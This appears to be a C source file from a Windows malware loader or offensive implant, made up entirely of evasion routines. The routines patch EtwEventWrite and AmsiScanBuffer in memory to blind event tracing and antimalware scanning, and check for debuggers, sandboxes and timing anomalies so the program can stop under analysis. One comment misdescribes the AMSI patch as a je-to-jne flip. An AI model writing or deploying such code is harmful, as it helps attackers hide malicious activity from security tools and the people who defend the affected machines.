// =============================================
// Evasion.c - ETW Bypass, AMSI Bypass,
//             Anti-Analysis
// =============================================

#include "Common.h"

// -----------------------------------------------
// ETW Bypass: Patch EtwEventWrite with xor eax,eax; ret
// This makes ETW tracing return success without logging
// -----------------------------------------------
BOOL PatchEtw(IN PAPI_HASHING pApi) {

    // Get ntdll base (deobfuscated)
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return FALSE;

    // Get EtwEventWrite address (deobfuscated)
    BYTE xEtw[] = XSTR_ETW_EVENT_WRITE;
    DEOBF(xEtw);
    PBYTE pEtwFunc = (PBYTE)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
    if (!pEtwFunc)
        return FALSE;

    // Patch bytes: xor rax, rax (48 31 C0) + ret (C3) - alternate encoding
    BYTE bPatch[] = { 0x48, 0x31, 0xC0, 0xC3 };

    DWORD dwOldProtection = 0;
    if (!pApi->pVirtualProtect(pEtwFunc, sizeof(bPatch), PAGE_EXECUTE_READWRITE, &dwOldProtection))
        return FALSE;

    MemCopy(pEtwFunc, bPatch, sizeof(bPatch));

    DWORD dwDummy = 0;
    pApi->pVirtualProtect(pEtwFunc, sizeof(bPatch), dwOldProtection, &dwDummy);

    return TRUE;
}

// -----------------------------------------------
// AMSI Bypass: Patch AmsiScanBuffer
// Flips je -> jne to force AMSI_RESULT_CLEAN path
// -----------------------------------------------
BOOL PatchAmsi(IN PAPI_HASHING pApi) {

    // Load amsi.dll if not already loaded (deobfuscated)
    BYTE xAmsiDll[] = XSTR_AMSI_DLL;
    DEOBF(xAmsiDll);
    HMODULE hAmsi = pApi->pLoadLibraryA((LPCSTR)xAmsiDll);
    if (!hAmsi)
        return FALSE;

    BYTE xAmsiFunc[] = XSTR_AMSI_SCAN_BUFFER;
    DEOBF(xAmsiFunc);
    PBYTE pAmsiScanBuffer = (PBYTE)pApi->pGetProcAddress(hAmsi, (LPCSTR)xAmsiFunc);
    if (!pAmsiScanBuffer)
        return FALSE;

    // Patch with: xor rax, rax (48 31 C0) + ret (C3) - alternate encoding
    BYTE bPatch[] = { 0x48, 0x31, 0xC0, 0xC3 };

    DWORD dwOldProtection = 0;
    if (!pApi->pVirtualProtect(pAmsiScanBuffer, sizeof(bPatch), PAGE_EXECUTE_READWRITE, &dwOldProtection))
        return FALSE;

    MemCopy(pAmsiScanBuffer, bPatch, sizeof(bPatch));

    DWORD dwDummy = 0;
    pApi->pVirtualProtect(pAmsiScanBuffer, sizeof(bPatch), dwOldProtection, &dwDummy);

    return TRUE;
}

// -----------------------------------------------
// Anti-Analysis Checks
// Returns TRUE if environment is clean
// -----------------------------------------------
BOOL AntiAnalysis(VOID) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb) {
        LOG("  [AA] PEB is NULL");
        return FALSE;
    }

    // 1. Check PEB->BeingDebugged
    if (pPeb->BeingDebugged) {
        LOG("  [AA] BLOCKED: BeingDebugged=TRUE");
        return FALSE;
    }
    LOG("  [AA] BeingDebugged: OK");

    // 2. Check NtGlobalFlag
    if (pPeb->NtGlobalFlag & 0x70) {
        LOG("  [AA] BLOCKED: NtGlobalFlag has debug flags");
        return FALSE;
    }
    LOG("  [AA] NtGlobalFlag: OK");

    // 3. Check number of processors (sandboxes often have 1)
    if (pPeb->NumberOfProcessors < 2) {
        LOG("  [AA] BLOCKED: NumberOfProcessors < 2");
        return FALSE;
    }
    LOG("  [AA] NumberOfProcessors: OK");

    // 4. Timing check
    ULONGLONG tsc1 = __rdtsc();
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    ULONGLONG tsc2 = __rdtsc();

    if ((tsc2 - tsc1) > 10000000) {
        LOG("  [AA] BLOCKED: RDTSC timing anomaly");
        return FALSE;
    }
    LOG("  [AA] RDTSC: OK");

    return TRUE;
}
